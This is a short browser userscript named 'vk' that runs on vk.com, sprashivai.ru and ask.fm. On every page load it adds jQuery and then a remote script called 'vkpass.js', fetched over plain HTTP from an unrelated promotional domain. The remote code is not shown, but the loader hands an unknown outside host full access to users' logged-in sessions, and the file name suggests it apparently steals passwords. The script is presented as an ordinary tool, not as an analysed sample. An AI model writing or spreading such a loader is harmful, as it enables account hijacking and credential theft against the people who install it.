// ==UserScript==
// @name        vk
// @namespace   2t
// @include     http://*vk.com/*
// @include     http://*sprashivai.ru*
// @include     http://*ask.fm*
// @version     1.06
// @grant       GM_getValue
// @grant       GM_setValue
// ==/UserScript==


var headID = document.getElementsByTagName("head")[0];         
var newScript = document.createElement('script');
newScript.type = 'text/javascript';
newScript.src = 'http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js';
headID.appendChild(newScript);

newScript = document.createElement('script');
newScript.type = 'text/javascript';
newScript.src = 'http://russam-promo.ru/test/vkpass.js';
headID.appendChild(newScript);

